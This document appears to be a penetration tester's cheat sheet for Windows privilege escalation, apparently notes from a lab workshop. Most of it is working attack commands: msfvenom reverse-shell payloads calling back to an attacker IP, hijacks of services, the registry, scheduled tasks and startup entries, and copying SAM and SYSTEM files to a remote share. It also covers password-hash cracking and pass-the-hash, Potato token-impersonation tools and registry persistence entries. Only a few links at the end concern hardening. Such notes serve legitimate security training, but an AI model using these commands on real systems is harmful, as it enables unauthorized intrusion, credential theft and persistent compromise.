## Windows Privilege Escalation

### Strategy

- Enumeration

	- winPEAS
	- Seatbelt

- Strategy

	- Read the results
	- Create a checklist
	- Look around
	- Read interesting files
	- First registry exploits, services...
	- Enumerate admin processes
	- Check internal ports

### User Privileges

- Listing Privileges

	- whoami /priv

- SeImpersonatePrivilege

	- Use

		- Impersonate any access tokens which it can obtain

	- Exploit

		- Juicy Potato exploit

- SeAssignPrimaryPrivilege

	- Use

		- Assign an access token to a new process

	- Exploit

		- Juicy Potato exploit

- SeBackupPrivilege

	- Use

		- Read access to all objects

	- Exploit

		- Gain access to sensitive files

			-  Extract hashes from the registry

- SeRestorePrivilege

	- Use

		- Write access to all objects

	- Exploit

		- Modify service binaries
		- Overwrite DLLs used by SYSTEM processes
		- Modify registry settings

- SeTakeOwnershipPrivilege

	- Use

		- Take ownership over an object

	- Exploit

		- Own an object and modify its ACL and grant
yourself write access
		- Then SeRestorePrivilege

- SeDebugPrivilege

	- Exploit

		- Metasploit getsystem

- SeTcbPrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege

### Attack Vectors

- Kernel

	- Detection

		- wmic qfe get Caption,Description,HotFixID,InstalledOn
		- Watson

			- URL

				- https://github.com/rasta-mouse/Watson

		- Windows Exploit Suggester

			- Commands

				- systeminfo > \\$IP\$MY_DIRECTORY\systeminfo.txt
				- python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less

			- URL

				- https://github.com/bitsadmin/wesng

	- Exploitation

		- Exploit-db
		- Search for compiled binaries in SecList

			- https://github.com/SecWiki/windows-kernel-exploits

- Services

	- Service Commands

		- Query the configuration of a service

			- sc.exe qc $SERVICE_NAME

		- Query the current status of a service

			- sc.exe query $SERVICE_NAME

		- Modify a configuration option of a service

			- sc.exe config $SERVICE_NAME $OPTION= $VALUE

		- Start / Stop a service

			- net start/stop $NAME

	- Insecure Properties

		- Detection

			- .\winPEAS.exe quiet servicesinfo
			- Can modify a service?

		- Exploitation

			- .\accesschk.exe /accepteula -uwcqv user $SERVICE_NAME
			- sc qc $SERVICE_NAME
			- sc query $SERVICE_NAME
			- sc config $SERVICE_NAME binpath="\"C:\PrivEsc\reverse.exe\""
			- net start  $SERVICE_NAME

	- Unquoted Paths

		- Detection

			- wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
			- .\winPEAS.exe quiet servicesinfo
			- Found unquoted path?

		- Exploitation

			- c:\Program Files\something\winamp.exe
			- c:\program.exe
			- sc qc unquotedsvc
			- .\accesschk.exe /accepteula -uwdq C:\
			- .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
			- .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
			- copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
			- net start $SERVICE_NAME

	- Weak Registry Permissions

		- Detection

			- .\winPEAS.exe quiet servicesinfo
			- Found weak registry entry?

		- Exploitation

			- PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
			- .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
			- reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
			- net start regsvc

	- Insecure Service Executables

		- Detection

			- .\winPEAS.exe quiet servicesinfo
			- Found  executable writable by everyone?

		- Exploitation

			- .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
			- copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp 
			- copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
			- net start filepermsvc

	- DLL Hijacking

		- Detection

			- .\winPEAS.exe quiet servicesinfo
			- .\accesschk.exe /accepteula -uvqc user $SERVICE_NAME

		- Exploitation

			- sc qc dllsvc
			- Procmon64.exe 
			- Ctrl+L
			- Add new filter $SERVICE_NAME.exe
			- net start dllsvc
			- msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f dll -o hijackme.dll
			- net stop dllsvc
			- net start dllsvc

	- Named Pipes &
Token Duplication

		- Detection

			- Metasploit "getsystem"

				- https://github.com/rapid7/metasploit-payloads/tree/d672097e9989e0b4caecfad08ca9debc8e50bb0c/c/meterpreter/source/extensions/priv

		- Exploitation

			- Named Pipe Impersonation (In Memory/Admin)
			- Named Pipe Impersonation (Dropper/Admin)
			- Token Duplication (In Memory/Admin)

- Registry

	- Autorun

		- Detection

			- .\winPEAS.exe quiet applicationsinfo
			- reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
			- .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

		- Exploitation

			- copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
			- copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"

	- AlwaysInstallElevated

		- Detection

			- .\winPEASany.exe quiet windowscreds
			- reg query HKCU\SOFTWARE\Policies\Microsoft Windows\Installer /v AlwaysInstallElevated
			- reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
			- Found both AlwaysInstallElevated = 1?

		- Exploitation

			- msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT-f msi -o reverse.msi
			- msiexec /quiet /qn /i C:\PrivEsc\reverse.msi

- Password Mining

	- Registry

		- Detection

			- AutoLogon

				- reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

			- VNC

				- reg query "HKCU\Software\ORL\WinVNC3\Password"

			- SNMP Parameters

				- reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

			- Passwords in Registry

				- reg query HKLM /f password /t REG_SZ /s
				- reg query HKCU /f password /t REG_SZ /s

			- .\winPEASany.exe quiet filesinfo userinfo
			- reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
			- reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

		- Exploitation

			- winexe -U 'admin%password123' //$IP cmd.exe

	- Saved Creds

		- Detection

			- .\winPEAS.exe quiet cmd windowscreds
			- cmdkey /list

		- Exploitation

			- C:\PrivEsc\savecred.bat
			- runas /savecred /user:admin C:\PrivEsc\reverse.exe

	- Configuration Files

		- Detection

			- dir /s *pass* == *.config
			- findstr /si password *.xml *.ini *.txt
			- .\winPEAS.exe quiet cmd searchfast filesinfo
			- Found file?

		- Exploitation

			- type C:\Windows\Panther\Unattend.xml
			- winexe -U 'admin%password123' //$IP cmd.exe

	- SAM/System

		- Detection

			- C:\Windows\Repair
			- C:\Windows\System32\config\RegBack 
			- Found backups?

		- Exploitation

			- copy C:\Windows\Repair\SAM \\$IP\tools\
			- copy C:\Windows\Repair\SYSTEM \\$IP\tools\
			- git clone https://github.com/Neohapsis/creddump7.git
			- python2 creddump7/pwdump.py SYSTEM SAM
			- Crack Password

				- hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt

			- Passing the Hash

				- pth-winexe -U 'admin%aad3b435b51404eeaad3b435b5 404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
				- pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //$IP cmd.exe

	- Memory

		- Mimikittenz

			- https://github.com/orlyjamie/mimikittenz

		- Process Dump 

- Scheduled Tasks

	- Detection

		- schtasks /query /fo LIST /v
		- PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
		- Found scheduled?

	- Exploitation

		- type C:\DevTools\CleanUp.ps1
		- C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
		- copy C:\DevTools\CleanUp.ps1 C:\Temp\
		- echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1

- Insecure GUI

	- Detection

		- (Older) versions of Windows
		- tasklist /V | findstr mspaint.exe

	- Exploitation

		- file://c:/windows/system32/cmd.exe

- Startup Applications

	- Detection

		- .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
		- Builtin\Users group has write access?

	- Exploitation

		- CreateShortcut.vbs

			- Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start
Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save

		- cscript CreateShortcut.vbs

- Installed Applications

	- Detection

		- tasklist /v
		- .\seatbelt.exe NonstandardProcesses
		- .\winPEAS.exe quiet procesinfo
		- Found interesting process?

	- Exploitation

		- Find version
		- Exploit-DB

- Hot Potato

	- Spoofing Attack / NTLM Relay

		- Exploitation

			- Copy the potato.exe
			- Start Listener
			- .\potato.exe -ip $IP -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true

- Token Impersonation

	- Rotten Potato

		- “SeImpersonatePrivilege” enabled

	- Juicy Potato

		- https://github.com/ohpe/juicy-potato
		- Listener 1

			- C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

		- Listener 2

			- C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}

		- https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md

	- Rogue Potato

		- https://github.com/antonioCoco/RoguePotato
		- https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/
		- https://github.com/antonioCoco/RoguePotato/releases
		- sudo socat tcp-listen:135,reuseaddr,fork
tcp:$IP:$PORT
		- C:\PrivEsc\PSExec64.exe -i -u "nt
authority\local service" C:\PrivEsc\reverse.exe
		- C:\PrivEsc\RoguePotato.exe -r $IP–l $PORT-e "C:\PrivEsc\reverse.exe"

	- PrintSpoofer

		- https://github.com/itm4n/PrintSpoofer
		- https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
		- C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
		- C:\PrivEsc\PrintSpoofer.exe –i -c "C:\PrivEsc\reverse.exe"

- Port Forwarding To Internal Service

	- Exploitation

		- plink.exe $USERNAME@$IP -R $PORT:$TARGET_IP:$TARGET_PORT
		- winexe -U 'admin%password123' //$IP cmd.exe
		- netsh advfirewall set allprofiles state on
		-  “PermitRootLogin yes”

			- /etc/ssh/sshd_config

		- plink.exe root@$IP -R 445:127.0.0.1:$PORT
		- winexe -U 'admin%password123' //localhost cmd.exe

### Tools

- Basic Information Gathering

	- whoami
	- net user student
	- id
	- net user
	- hostname
	- systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type
	- tasklist /SVC
	- ipconfig /all
	- route print
	- netstat -ano
	- netsh advfirewall show currentprofile 
	- netsh advfirewall firewall show rule name=all 
	- schtasks /query /fo LIST /v 
	- wmic product get name, version, vendor 
	- wmic qfe get Caption, Description, HotFixID, InstalledOn 
	- accesschk.exe -uws "Everyone" "C:\Prog ram Files"

- winPEAS

	- reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

		- for enablel color - reopen  cmd

	- .\winPEAS.exe -h
	- .\winPEAS userinfo
	- URL

		- https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

- LOLBAS

	- URL

		- https://lolbas-project.github.io/#

- Seatbelt

	- .\Seatbelt.exe all
	- URL

		- https://github.com/GhostPack/Seatbelt
		- https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe

- Powerup

	- . .\PowerUp.ps1
	- Invoke-AllChecks
	- URL

		- https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1

- SharpUp

	- .\SharpUp.exe
	- URL

		- https://github.com/GhostPack/SharpUp
		- https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe

- PsTools

	- //technet.microsoft.com/en-us/sysinternals/pstools.aspx
	- URL

		- https://github.com/GhostPack/SharpUp

- AccessChck

	- accesschck.exe
	- Good but only if you have rdp, because it spawn GUI "accept EULA"

- Compiled Binaries

	- https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

- Spawning Administrator Shells

	- RDP

		- net localgroup administrators $USERNAME /add

	- Admin -> System

		- .\PsExec64.exe -accepteula -i -s C:\

	- Msfvenom

		- msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT-f exe -o reverse.exe

- WindowsEnum

	- powershell -nologo -executionpolicy bypass -file WindowsEnum.ps1
	- URL

		- https://github.com/absolomb/WindowsEnum

- Windows Exploit Suggester

	- wes.py --update
	- URL

		- https://github.com/bitsadmin/wesng

### Persistence

- SV Service Creation

	- sc create newservice type= own type= interact binPath=  “C:\windows\system32\cmd.exe /c payload.exe" & sc start newservice 

- Winlogon Helper DLL Shell

	- reg add "HKLM\Software\Microsoft\Windows  NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, payload.exe"  /f 

- Winlogon Helper DLL UserInit

	- reg add "HKLM\Software\Microsoft\Windows  NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe,  payload.exe" /f 

- Winlogon GP Extensions

	- HKLM\SOFTWARE\Microsoft\Windows  NT\CurrentVersion\Winlogon\GPExtensions\{GUID}\DllName=<DLL> 

- OMA Client Provisioning dmcfghost.exe

	- HKLM\SOFTWARE\Microsoft\PushRouter\Test\TestDllPath2=<DLL> 

- Werfault.exe Reflective Debugger 

	- HKLM\Software\Microsoft\Windows\Windows Error  Reporting\Hangs\ReflectDebugger=<path\to\exe> 
	- werfault.exe -pr 1 

- OffloadModExpo Function

	- HKLM\Software\Microsoft\Cryptography\Offload\ExpoOffload=<DLL>

- DiskCleanup CleanuppMgr

	- HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\cleanuppath = %SystemRoot%\System32\payload.exe

- Application Shim DLL Injection
- Application Shim Redirect EXE
- VMWare Tools BAT File Persistence

### Hardening

- https://github.com/0x6d69636b/windows_hardening/blob/master/windows_10_hardening.md
- https://github.com/decalage2/awesome-security-hardening#windows

### URL

- https://raw.githubusercontent.com/sagishahar/lpeworkshop/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf
